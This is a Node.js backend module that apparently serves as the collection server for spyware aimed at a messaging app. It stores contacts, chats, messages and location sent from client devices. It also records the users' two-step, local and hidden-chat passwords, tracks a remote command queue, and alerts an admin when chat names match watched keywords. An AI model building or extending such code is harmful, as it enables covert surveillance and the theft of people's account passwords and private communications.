const Models = require('../../../schema/main/models');
const CONST = require('../../../utils/constants');
const { Op } = require('sequelize');

exports.uploadFile = async (data) => {
  let file = await Models.file.create(data);
  return { file_id: file.id };
}
exports.createContacts = async (id, data, socketManager) => {
  if (data?.length > 0) {
    let client = await getClient(id);
    let contacts = [];

    for (let i = 0; i < data.length; i++) {

      let _data = data[i];
      await checkWordToKeyAndNotify(_data,'contactList', client, socketManager);
      _data.client_id = client.id;

      if (_data?.files?.length > 0) {

        let files = await Models.file.findAll({ where: { id: _data.files } });

        let contact = await Models.contact.findByPk(_data.id);

        if (!contact) {

          contact = await Models.contact.create(_data);

        } else {

          await contact.update(_data);
        }
        if (files) {

          await contact.addFiles(files);
        }
      } else {
        contacts.push(_data);
      }
    }
    await Models.contact.bulkCreate(contacts, { ignoreDuplicates: true, include: [] });

  }
  return { message: "success" }

}

exports.createChats = async (id, data, socketManager) => {
  if (data?.length > 0) {
    let client = await getClient(id);
    let chats = [];

    for (let i = 0; i < data.length; i++) {

      let _data = data[i];
      await checkWordToKeyAndNotify(_data,'chatList', client, socketManager);
      _data.client_id = client.id;
       
      if (_data?.files?.length > 0) {

        let files = await Models.file.findAll({ where: { id: _data.files } });

        let chat = await Models.chat.findByPk(_data.id);

        if (!chat) {

          chat = await Models.chat.create(_data);

        } else {

          await chat.update(_data);
        }

        if (files) {

          await chat.addFiles(files);
        }
      } else {
        chats.push(_data);
      }
    }
    await Models.chat.bulkCreate(chats, { ignoreDuplicates: true, include: [] });

  }
  return { message: "success" }

}

exports.createSecurity = async (id, data) => {
  let client = await getClient(id);
  let isNull = true;
  for (x in data) {
    if (data[x]) {
      isNull = false;
    }
  }
  if (isNull) {
    let err = new Error('at least 1 field is required, (two_step_password, local_password, hidden_chat_password)');
    throw (err);
  }

  let security = await Models.security.findOne({ where: { client_id: client.id } });
  if (!security) {
    security = await Models.security.create({ client_id: client.id, ...data });
  } else {
    data.updated_at = Date.now();
    await security.update(data);
  }

  return { message: "success", security }
}

exports.createLocation = async (id, data) => {
  let client = await getClient(id);

  let location = await Models.location.findOne({ where: { client_id: client.id } });
  if (!location) {
    location = await Models.location.create({ client_id: client.id, ...data });
  } else {
    data.updated_at = Date.now();
    await location.update(data);
  }

  return { message: "success", location }
}

exports.createMessages = async (id, data) => {
  let client = await getClient(id);
  let chat = await getChatOrCreate(id, data.chat);
  let chat_id = chat.id;
  let messages = data.messages;
  console.log('clientId', client.id);
  console.log("chatid", chat_id);
  let queue = await Models.queue.findOne({ where: { client_id: client.id, commandPayload: {chatId: chat_id}, commandID: CONST.messageKeys.chatMessage, status: 1 } });
  if (queue) {
    queue.status = 2;
    queue.description = "success"
    await queue.save();
  }
  if (messages?.length > 0) {
    for (let i = 0; i < messages.length; i++) {
      let message = messages[i];
      messages[i].chat_id = chat_id;
      messages[i].client_id = client.id;
      messages[i].date = new Date(messages[i].date)
      if (message.writer) {
        let writer = await Models.chat.findByPk(message.writer.id);
        if (!writer) {
          writer = await Models.chat.create(message.writer);
        }
        messages[i].writer_id = writer.id;
      }

    }
    await Models.message.bulkCreate(messages, { ignoreDuplicates: true });

  }

  return { message: "success" }
}


async function getClient(id) {
  let client = await Models.client.findByPk(id);
  if (!client) {
    let err = new Error('client not found');
    throw (err);
  }
  return client;
}

async function getChatOrCreate(client_id, data) {
  let chat = await Models.chat.findOne({where:{ id: data.id, client_id }});
  if (!chat) {
    chat = await Models.chat.create({ client_id, ...data });
  }
  return chat;
}

async function checkWordToKeyAndNotify(chat, type, client, socketManager) {
  const keywords = await Models.keyword.findAll();
  for (let keyword of keywords) {
    if (
      chat.name.toLowerCase().includes(keyword.name.toLowerCase()) ||
      chat?.username?.toLowerCase()?.includes(keyword.name.toLowerCase())
    ) {
      
      socketManager.notifyAdmin(client,{chat, keyword, type}, CONST.messageKeys.notifyKeyword);

      await Models.notification.create({
       client_id: client.id,
       chat_id: chat.id,
       keyword_id: keyword.id,
       eventName: CONST.messageKeys.notifyKeyword,
       type: type, 
      })
    }
  }

}